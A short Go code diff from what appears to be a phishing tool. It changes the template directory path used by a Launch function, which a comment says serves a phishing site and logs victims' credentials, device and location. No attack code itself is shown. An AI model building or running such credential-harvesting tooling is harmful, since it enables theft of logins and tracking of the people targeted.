@@ -41,7 +41,7 @@ func getIPInfo(ip string) (*IPDetails, error) {
 
 // Launch serves the phishing site and logs creds + device + location info
 func Launch(templateName string, port int) {
-	templatePath := filepath.Join("modules", "phish", "templates", templateName)
+	templatePath := filepath.Join("modules", "phish", "web", "templates", templateName)
 	indexFile := filepath.Join(templatePath, "index.html")
 
 	if _, err := os.Stat(indexFile); os.IsNotExist(err) {
